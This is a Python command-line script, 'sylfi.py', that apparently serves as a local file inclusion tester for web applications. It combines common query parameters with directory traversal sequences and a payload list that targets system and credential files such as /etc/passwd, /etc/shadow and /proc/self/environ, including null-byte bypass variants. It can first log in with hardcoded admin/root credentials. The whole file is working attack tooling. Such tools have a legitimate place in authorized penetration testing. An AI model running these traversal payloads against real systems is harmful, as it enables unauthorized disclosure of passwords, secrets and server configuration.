#!/usr/bin/python3

# Simple Local File Inclusion Tester made with Python 3

# import sys
# import os
import requests
import argparse
import time
from colorama import Fore, init

init()

# lfi parameters list

parameters = [
    "?file=",
    "?page=",
    "?path=",
    "?site=",
    "?dir=",
    "?content=",
    "?action=",
    "?locate=",
    "?conf=",
    "?download=",
]


# TODO: add more lfi payloads

# lfi payload list
payload = [
    # "//....//....//etc/passwd",
    "/etc/passwd",
    "/etc/passwd%00",
    "/etc/passwd%2500",
    "/etc/issue",
    "/etc/shadow",
    "/etc/group",
    "/etc/hosts",
    "/etc/motd",
    "/etc/mysql/my.cnf",
    "/proc/self/environ",
    "/proc/version",
    "/proc/cmdline",
]

parent_dir = "/.."

# create the parser
arg_parser = argparse.ArgumentParser(
    prog='sylfi.py',
    description='Test for LFI in specified URL',
    usage="\nsylfi.py -u 'http://<domain_name>:<port>/file_name.php' -p '?file='\nOr if Python is not in path:\npython sylfi.py -u 'http://<domain_name>:<port>/file_name.php' -p '?file='"
)

# add the CLI flags/options
arg_parser.add_argument(
    "-u", "--url",
    required=True,
    type=str,
    help="specify target URL in quotes",
)

# add CLI flag for LFI parameter
arg_parser.add_argument(
    "-p", "--parameter",
    default="",
    type=str,
    help="specify known LFI parameter in quotes (?[file|page|path|site]=)",
)

# add CLI flag for directory traversal depth
arg_parser.add_argument(
    "-d", "--dir-depth",
    default=5,
    type=int,
    help="specify directory traversal depth",
)

# user login parameter
arg_parser.add_argument(
    "-l", "--login-url",
    default="",
    type=str,
    help="specify login URL in quotes for POST",
)

# TODO: add encoding support
# arg_parser.add_argument(
#     "-e", "--encode",
#     action='store_true',
#     help="encode LFI URL",
# )

# TODO: add verbose mode support
# arg_parser.add_argument(
#     "-v", "--verbose",
#     action='store_true',
#     help="print all LFI test URLs",
# )

# parse cli arguments
args = arg_parser.parse_args()

# set url variable value to the specified url
url = str(args.url)

# check the url for lfi
lfi_param = str(args.parameter)

# directory traversal depth
level = args.dir_depth

# login param
loginURL = args.login_url

# TODO: add content length header support later for both http and https
# TODO: log all the redirects separately


# handle simple login
def login(url):
    print(f"{Fore.LIGHTGREEN_EX}Running login function with provided values...")
    # edit this line below to change parameters and their values as needed
    # use Burp Suite to check login POST request to get parameters
    login_payload = {'username': 'admin', 'password': 'root'}

    sess = requests.Session()
    login_req = sess.post(url, data=login_payload)
    if login_req.status_code >= 200 and login_req.status_code < 300:
        print(f"{Fore.LIGHTGREEN_EX}Login URL status code: {login_req.status_code}")
    else:
        print(f"{Fore.LIGHTRED_EX}Login URL status code: {login_req.status_code}")
        print(f"{Fore.LIGHTRED_EX}{login_req.text}")
    return sess


# lfi test function
def test_lfi(lfi_url):
    if len(loginURL) >= 5:
        session = login(loginURL)
        response = session.get(lfi_url, stream=True)
    else:
        response = requests.get(lfi_url, stream=True)
    # print(response.content)
    # if response.status_code >= 300 and response.status_code < 400:
    # print(f"{Fore.LIGHTMAGENTA_EX}REDIRECT => URL: {response.url}:{response.history}\nStatus Code: {response.status_code}\nContent Length: {response.headers.get('content-length', 'Header Not Found')}")
    if response.status_code >= 200 and response.status_code < 300:
        print(f"{Fore.LIGHTYELLOW_EX}URL: {response.url}: {response.history}")
        print(f"{Fore.LIGHTGREEN_EX}Status Code: {response.status_code}\nContent Length: {response.headers.get('content-length', 'Header Not Found')}")
        print(f"{Fore.LIGHTBLUE_EX}=====================================")

    else:
        print(f"{Fore.LIGHTRED_EX}Status Code: {response.status_code}\nContent Length: {response.headers.get('content-length', 'Header Not Found')}")
        print(f"{Fore.LIGHTMAGENTA_EX}=====================================")


# use all the parameters from list. slower. might get you blocked
def lfi_with_default_param():
    print(f"{Fore.LIGHTRED_EX}No known LFI parameter specified. This will be slower and might even get you blocked.")
    time.sleep(3)
    print(f"{Fore.LIGHTCYAN_EX}Testing with default parameters...")
    for i in range(len(parameters)):
        for j in range(level):
            for k in range(len(payload)):
                lfiURL = url + parameters[i] + j*parent_dir + payload[k]
                test_lfi(lfiURL)
                # print(lfiURL)


def lfi_with_known_param():
    print(f"{Fore.LIGHTYELLOW_EX}LFI parameter set to: " + str(lfi_param))
    for j in range(level):
        for k in range(len(payload)):
            lfiURL = url + lfi_param + j*parent_dir + payload[k]
            test_lfi(lfiURL)
            # print(lfiURL)


def lfi_param_check():
    if lfi_param == "":
        lfi_with_default_param()
    elif len(lfi_param) >= 1:
        lfi_with_known_param()


lfi_param_check()
